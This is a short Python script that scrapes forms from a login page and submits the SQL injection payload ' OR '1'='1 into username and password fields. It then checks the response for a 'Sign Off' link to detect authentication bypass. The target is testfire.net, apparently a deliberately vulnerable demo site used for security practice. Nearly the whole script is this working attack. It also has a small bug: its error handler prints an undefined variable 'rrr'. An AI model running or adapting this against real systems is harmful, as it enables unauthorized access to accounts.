import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

s = requests.Session()
s.headers["User-Agent"] = (
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15"
)

def getForms(url):
    resp = s.get(url, timeout=10)
    resp.raise_for_status()
    soup = BeautifulSoup(resp.content, "html.parser")
    return soup.find_all("form")

def formDetails(form):
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        name = input_tag.attrs.get("name")
        if not name:
            continue
        input_type = input_tag.attrs.get("type", "text")
        inputs.append({
            "name": name,
            "type": input_type,
            "value": input_tag.attrs.get("value", ""),
        })

    return {"action": action, "method": method, "inputs": inputs}

def sqlInjectionScan(url):
    try:
        forms = getForms(url)
    except requests.exceptions.RequestException as e:
        print(f"[!] Could not fetch {url}: {e}")
        return

    print(f"[+] Detected {len(forms)} form(s) on {url}.\n")

    for form in forms:
        details = formDetails(form)
        method = details["method"]
        action = details["action"] or ""
        action_url = urljoin(url, action)

        if method not in ("get", "post"):
            print(f"  [!] Skipping form with method='{method}'\n")
            continue

        # Build the payload to bypass login
        payload_value = "' OR '1'='1"
        data = {}

        for field in details["inputs"]:
            name = field["name"].lower()
            # If this is the username or password field, inject bypass payload
            if name in ("uid", "user", "username", "passw", "password"):
                data[field["name"]] = payload_value
            elif field["type"] == "hidden" or field["value"]:
                # Preserve hidden fields (e.g. JSESSIONID) or any prefilled value
                data[field["name"]] = field["value"]
            else:
                # Give a dummy value to all other non-submit inputs
                data[field["name"]] = "testing"

        print(f"Testing SQL-injection bypass at {action_url} …")

        try:
            if method == "post":
                resp = s.post(action_url, data=data, timeout=10)
            else:
                resp = s.get(action_url, params=data, timeout=10)
        except requests.exceptions.RequestException as err:
            print(f"[!] Request to {action_url} failed: {rrr}\n")
            continue

        body = resp.text.lower()
        # If login succeeded, TestFire’s protected pages contain a “Sign Off” link
        if "sign off" in body:
            print(f"[!] Authentication bypass detected on {action_url}\n")
        else:
            print(f"[+] No bypass detected\n")

if __name__ == "__main__":
    urlToCheck = "http://testfire.net/login.jsp"
    sqlInjectionScan(urlToCheck)
